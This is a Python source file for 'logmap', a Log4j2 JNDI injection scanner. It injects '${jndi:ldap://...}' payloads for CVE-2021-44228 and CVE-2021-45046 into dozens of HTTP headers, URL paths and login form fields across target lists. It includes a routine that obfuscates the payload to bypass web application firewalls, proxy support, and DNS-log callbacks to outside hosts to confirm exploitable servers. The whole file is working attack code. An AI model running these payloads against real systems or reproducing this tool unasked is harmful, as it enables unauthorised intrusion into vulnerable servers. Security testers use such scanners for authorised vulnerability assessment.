#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#      __
#     / /  ___  ___ ___ _  ___ ____
#    / /__/ _ \/ _ `/  ' \/ _ `/ _ \
#   /____/\___/\_, /_/_/_/\_,_/ .__/
#             /___/          /_/
#
#  from https://github.com/zhzyker/logmap
#  Log4j2 jndi injection fuzz tool
import sys
import time
import json
import socket
import random
import string
import hashlib
import requests
import argparse
import textwrap
import socks
import urllib3
import platform
import threading
from random import getrandbits
from urllib.parse import urlparse

urllib3.disable_warnings()


def logger(log="green", text=""):
    if platform.system().lower() == 'windows':
        print(text)
    else:
        if log == "green":
            print("\033[92m{}\033[0m".format(text))
        if log == "green_b":
            print("\033[1;92m{}\033[0m".format(text))
        if log == "red":
            print("\033[91m{}\033[0m".format(text))
        if log == "white":
            print("\033[37m{}\033[0m".format(text))
        if log == "yellow":
            print("\033[33m{}\033[0m".format(text))
        if log == "blue":
            print("\033[34m{}\033[0m".format(text))
        if log == "banner":
            print("\033[1;36m{}\033[0m".format(text))


def banners():
    logger("banner", """    __                           
   / /  ___  ___ ___ _  ___ ____ 
  / /__/ _ \/ _ `/  ' \/ _ `/ _ \\
 /____/\___/\_, /_/_/_/\_,_/ .__/
           /___/          /_/    \n""")


def random_md5():
    st = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    md = hashlib.md5("".join(st).encode('utf-8')).hexdigest()
    return str(md)


def random_str(i=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=i))


def arg():
    parser = argparse.ArgumentParser(usage="python3 logmap.py [options]", add_help=False)
    gen = parser.add_argument_group("Help", "How to use")
    gen.add_argument("-u", "--url", dest="url", type=str, help=" Target URL (e.g. http://example.com )")
    gen.add_argument("-f", "--file", dest="file", help="Select a target list file (e.g. list.txt )")
    gen.add_argument("-c", "--cve", dest="cve", metavar="1", type=int, default=1,
                     help="CVE [1:CVE-2021-44228, 2:CVE-2021-45046] default 1")
    gen.add_argument("-d", "--dns", dest="dns", metavar="1", type=int, default=1,
                     help="Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1")
    gen.add_argument("-p", dest="payload", help="Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} ) ")
    gen.add_argument("-t", dest="timeout", metavar="20", default=20, help="Http timeout default 20s")
    gen.add_argument("-o", dest="output", metavar="file", help="Output file")
    gen.add_argument("-w", "--waf", dest="waf", action='store_true', help="Obfuscate the payload and bypass waf")
    gen.add_argument("--proxy", dest="proxy", help="Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)")
    gen.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    return parser.parse_args()


def print_roundtrip(response, *args, **kwargs):
    format_headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items())
    if response.request.body == None:
        return textwrap.dedent('''
               ********************** request **********************

               {req.method} {req.url}
               {reqhdrs}

               *****************************************************
           ''').format(
            req=response.request,
            res=response,
            reqhdrs=format_headers(response.request.headers),
            reshdrs=format_headers(response.headers),
        )
    return textwrap.dedent('''
        ********************** request **********************

        {req.method} {req.url}
        {reqhdrs}

        {req.body}

        *****************************************************
    ''').format(
        req=response.request,
        res=response,
        reqhdrs=format_headers(response.request.headers),
        reshdrs=format_headers(response.headers),
    )


def confuse_chars(char):
    """
    Reference: https://github.com/woodpecker-appstore/log4j-payload-generator/blob/master/src/main/java/me/gv7/woodpekcer/vuldb/StringObfuscator2.java
    by https://github.com/c0ny1
    """
    garbageCount = random.randint(1, 5)
    i = 0
    garbage = ''
    lst = []
    while i < garbageCount:
        garbageLength = random.randint(1, 6)
        garbageWord = random_str(garbageLength)
        i += 1
        lst.append(garbageWord)
        lst.append(":")
        garbage = ''.join(lst)
    return "${{{0}-{1}}}".format(garbage, char)


def confuse_payload(chars):
    """
    Reference: https://github.com/woodpecker-appstore/log4j-payload-generator/blob/master/src/main/java/me/gv7/woodpekcer/vuldb/StringObfuscator2.java
    by https://github.com/c0ny1
    """
    lst = []
    for char in chars:
        use = not getrandbits(1)
        if char == "$" or char == "{" or char == "}" or char == "#":
            use = False
        if use:
            lst.append(confuse_chars(char))
        else:
            lst.append(char)
    return ''.join([str(s) for s in lst])


def fuzz_headers(threads, lock, target, domain, timeout, headers, result_md5_req, md5, key, value):
    dns_domain = md5 + "." + domain
    value = value.replace("DNS_LOG_DOMAIN", dns_domain)
    if args.waf:
        value = confuse_payload(value)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        key: value
    }
    try:
        logger("green", "[*] Fuzz headers: {}".format(key))
        req = requests.get(target, timeout=timeout, headers=headers, verify=False)
        result_md5_req[md5] = print_roundtrip(req)
    except:
        logger("green_b", "[?] Fuzz headers: {} abnormal".format(key))
        result_md5_req[md5] = "********************** payload **********************\n\n" \
                              "{}: {}\n\n" \
                              "*****************************************************".format(key, value)


def fuzz_path(threads, lock, target, domain, timeout, headers, result_md5_req, md5, key_path, value_path):
    dns_domain = md5 + "." + domain
    value_path = value_path.replace("DNS_LOG_DOMAIN", dns_domain)
    if args.waf:
        value_path = confuse_payload(value_path)
    path_p = key_path + value_path
    try:
        logger("green", "[*] Fuzz url path: {}".format(path_p))
        req = requests.get(target + path_p, timeout=timeout, headers=headers, verify=False)
        result_md5_req[md5] = print_roundtrip(req)
    except:
        result_md5_req[md5] = "********************** payload **********************\n\n" \
                              "{}\n\n" \
                              "*****************************************************".format(path_p)
        logger("green_b", "[?] Fuzz url path: {} abnormal".format(path_p))
        result_md5_req[md5] = "payload: {}".format(path_p)


def fuzz_body(threads, lock, target, domain, timeout, headers, result_md5_req, md5, key_body, payload):
    dns_domain = md5 + "." + domain
    payload_body = payload.replace("DNS_LOG_DOMAIN", dns_domain)
    if args.waf:
        payload_body = confuse_payload(key_body.replace("DNS_LOG_DOMAIN", dns_domain))
    body = key_body.replace("RE_PAYLOAD", payload_body)
    try:
        logger("green", "[*] Fuzz body: {}".format(body))
        req = requests.post(target, data=body, timeout=timeout, headers=headers, verify=False)
        result_md5_req[md5] = print_roundtrip(req)
    except:
        logger("green_b", "[?] Fuzz body: {} abnormal".format(body))
        result_md5_req[md5] = "********************** payload **********************\n\n" \
                              "{}\n\n" \
                              "*****************************************************".format(body)


def run_fuzz(target, payload, timeout, domain, token):
    lock = threading.Lock()
    path_payload_list = {
        "": "",
        "/hello": payload,
        "?id=": payload,
        "?username=": payload,
        "?page=": payload,
    }
    headers= {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    }
    headers_payload_lists = {
        "Accept": payload,
        "Accept-Charset": payload,
        "Accept-Datetime": payload,
        "Accept-Encoding": payload,
        "Accept-Language": payload,
        "Ali-CDN-Real-IP": payload,
        "Authorization": payload,
        "Cache-Control": payload,
        "Cdn-Real-Ip": payload,
        "Cdn-Src-Ip": payload,
        "CF-Connecting-IP": payload,
        "Client-IP": payload,
        "Contact": payload,
        "Cookie": payload,
        "DNT": payload,
        "Fastly-Client-Ip": payload,
        "Forwarded-For-Ip": payload,
        "Forwarded-For": payload,
        "Forwarded": payload,
        "Forwarded-Proto": payload,
        "From": payload,
        "If-Modified-Since": payload,
        "Max-Forwards": payload,
        "Originating-Ip": payload,
        "Origin": payload,
        "Pragma": payload,
        "Proxy-Client-IP": payload,
        "Proxy": payload,
        "Referer": payload,
        "TE": payload,
        "True-Client-Ip": payload,
        "True-Client-IP": payload,
        "Upgrade": payload,
        "User-Agent": payload,
        "Via": payload,
        "Warning": payload,
        "WL-Proxy-Client-IP": payload,
        "X-Api-Version": payload,
        "X-ATT-DeviceId": payload,
        "X-Client-IP": payload,
        "X-Cluster-Client-IP": payload,
        "X-Correlation-ID": payload,
        "X-Csrf-Token": payload,
        "X-CSRFToken": payload,
        "X-Do-Not-Track": payload,
        "X-Foo-Bar": payload,
        "X-Foo": payload,
        "X-Forwarded-By": payload,
        "X-Forwarded-For-Original": payload,
        "X-Forwarded-For": payload,
        "X-Forwarded-Host": payload,
        "X-Forwarded": payload,
        "X-Forwarded-Port": payload,
        "X-Forwarded-Protocol": payload,
        "X-Forwarded-Proto": payload,
        "X-Forwarded-Scheme": payload,
        "X-Forwarded-Server": payload,
        "X-Forwarded-Ssl": payload,
        "X-Forwarder-For": payload,
        "X-Forward-For": payload,
        "X-Forward-Proto": payload,
        "X-Frame-Options": payload,
        "X-From": payload,
        "X-Geoip-Country": payload,
        "X-Host": payload,
        "X-Http-Destinationurl": payload,
        "X-Http-Host-Override": payload,
        "X-Http-Method-Override": payload,
        "X-HTTP-Method-Override": payload,
        "X-Http-Method": payload,
        "X-Http-Path-Override": payload,
        "X-Https": payload,
        "X-Htx-Agent": payload,
        "X-Hub-Signature": payload,
        "X-If-Unmodified-Since": payload,
        "X-Imbo-Test-Config": payload,
        "X-Insight": payload,
        "X-Ip": payload,
        "X-Ip-Trail": payload,
        "X-Leakix": payload,
        "X-Original-URL": payload,
        "X-Originating-IP": payload,
        "X-ProxyUser-Ip": payload,
        "X-Real-Ip": payload,
        "X-Remote-Addr": payload,
        "X-Remote-IP": payload,
        "X-Requested-With": payload,
        "X-Request-ID": payload,
        "X-True-IP": payload,
        "X-UIDH": payload,
        "X-Wap-Profile": payload,
        "X-WAP-Profile": payload,
        "X-XSRF-TOKEN": payload,
    }
    body_payload_lists = [
        'payload=RE_PAYLOAD',
        'user=RE_PAYLOAD',
        'pass=RE_PAYLOAD',
        'username=RE_PAYLOAD',
        'password=RE_PAYLOAD',
        'login=RE_PAYLOAD',
        'email=RE_PAYLOAD',
        'principal=RE_PAYLOAD',
        'token=RE_PAYLOAD',
        'verify=RE_PAYLOAD',
        'dest=RE_PAYLOAD',
        'login_username=RE_PAYLOAD',
        'login_password=RE_PAYLOAD',
        'authorization=RE_PAYLOAD',
        'city=RE_PAYLOAD',
        'user=RE_PAYLOAD&pass=RE_PAYLOAD',
        'username=RE_PAYLOAD&password=RE_PAYLOAD',
        'USERNAME=RE_PAYLOAD&PASSWORD=RE_PAYLOAD',
        'j_username=RE_PAYLOAD&j_password=RE_PAYLOAD',
    ]
    result_md5_req = {}
    threads = []
    threads.append([threading.Thread(target=fuzz_headers, args=(threads, lock, target, domain, timeout, headers, result_md5_req, random_md5(), key, value)) for (key, value) in headers_payload_lists.items()])
    for (key_path, value_path) in path_payload_list.items():
        if key_path == "":
            threads.append([threading.Thread(target=fuzz_body, args=(threads, lock, target, domain, timeout, headers, result_md5_req, random_md5(), key_body, payload)) for key_body in body_payload_lists])
        threads.append(threading.Thread(target=fuzz_path, args=(threads, lock, target, domain, timeout, headers, result_md5_req, random_md5(), key_path, value_path)))
    i = 0
    for t in threads:
        i += 1
        if i == 3:
            break
        for o in t:
            o.start()
        for o in t:
            o.join()

    if args.payload:
        logger("yellow", "[*] Please check your dns")
    else:
        if dns_verify(args, target, result_md5_req, token):
            logger("green", "[+] Log4j2 fuzz end")
        else:
            logger("yellow", "[-] Not found Log4j2 vuln, fuzz end")


def check_log4j2(args):
    if args.url == args.file:
        logger("red", "[!] Must specify -u or -f")
        sys.exit(0)
    dns_result = dnslog(args, type=args.dns)
    domain = dns_result[0]
    token = dns_result[1]
    timeout = args.timeout
    logger("yellow", "[*] Get domain: {} token: {}".format(domain, token))
    if args.payload:
        payload = args.payload
    elif args.cve == 1:
        payload = "${{jndi:ldap://{0}:443/{1}}}".format("DNS_LOG_DOMAIN", random_str())
        logger("yellow",
               "[+] Use CVE-2021-44228 paylaod: {}"
               .format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
    else:
        payload = "${{jndi:ldap://127.0.0.1#{0}:443/{1}}}".format("DNS_LOG_DOMAIN", random_str())
        logger("yellow",
               "[+] Use CVE-2021-45046 paylaod: {}"
               .format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
    if args.file:
        for line in open(args.file):
            line = line.strip()
            line = line.strip("\r\n")
            if "http" not in line:
                line = "http://" + line
            if line == "":
                continue
            logger("yellow", "[+] Check target: {}".format(line))
            if not line:
                break
            run_fuzz(line, payload, timeout, domain, token)
    else:
        if "http" not in args.url:
            args.url = "http://" + args.url
        run_fuzz(args.url, payload, timeout, domain, token)


def dns_verify(args, target, result_md5_req, token):
    logger("yellow", "[*] Get dnslog results")
    dnslog_result = dnslog(args, type=args.dns, function="verify", token=token)
    i = 0
    for (key, value) in result_md5_req.items():
        if key in dnslog_result:
            logger("red", "[+] Found the Log4j2 vulnerability, Md5 is: {}".format(key))
            logger("white", value)
            if args.output:
                with open(args.output, 'a') as output_file:
                    output_file.write("{}\r\n{}\r\n".format(target, value))
            i += 1
    if i != 0:
        return True
    return False


def dnslog(args, type=1, function="get", token="", md5=""):
    if type == 1:
        if function == "get":
            try:
                request = requests.get("https://log.xn--9tr.com/new_gen", verify=False, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"})
                domain = json.loads(request.text)["domain"]
                key = json.loads(request.text)["key"]
                token = json.loads(request.text)["token"]
                result = [domain, token]
                return result
            except:
                logger("red", "[-] https://log.xn--9tr.com/new_gen Request failed")
        elif function == "verify":
            try:
                time.sleep(2)
                request = requests.get("https://log.xn--9tr.com/" + token, verify=False)
                return request.text
            except:
                logger("red", "[-] https://log.xn--9tr.com/{} Request failed".format(token))
                return ""
        return ["null", "null"]
    elif type == 2:
        if function == "get":
            if "xxxxxx" in args.ceye[0]:
                logger("red", "[!] Need to set domain and token http://ceye.io")
                sys.exit(0)
            return args.ceye
        elif function == "verify":
            try:
                time.sleep(2)
                request = requests.get("http://api.ceye.io/v1/records?token={}&type=dns".format(args.ceye[1]))
                return request.text
            except:
                logger("red", "[-] http://api.ceye.io/v1/records?token={}&type=dns Request failed".format(args.ceye[1]))
                return ""
        return ["null", "null"]


def proxy(args):
    if args.proxy:
        _url = urlparse(args.proxy)
        hostname = _url.hostname
        port = _url.port
        scheme = _url.scheme
        if "http" in scheme:
            socks.set_default_proxy(socks.HTTP, hostname, port)
            socket.socket = socks.socksocket
        elif "socks5" in scheme:
            socks.set_default_proxy(socks.SOCKS5, hostname, port)
            socket.socket = socks.socksocket
        elif "socks4" in scheme:
            socks.set_default_proxy(socks.SOCKS4, hostname, port)
            socket.socket = socks.socksocket
        logger("yellow", "[+] Use proxy {}".format(args.proxy))


if __name__ == '__main__':
    banners()
    logger("blue", "[*] Log4j2 jndi injection fuzz tool")
    logger("blue", "[*] Version: 0.6")
    logger("blue", "[*] From https://github.com/zhzyker/logmap")
    args = arg()
    args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
    proxy(args)
    check_log4j2(args)
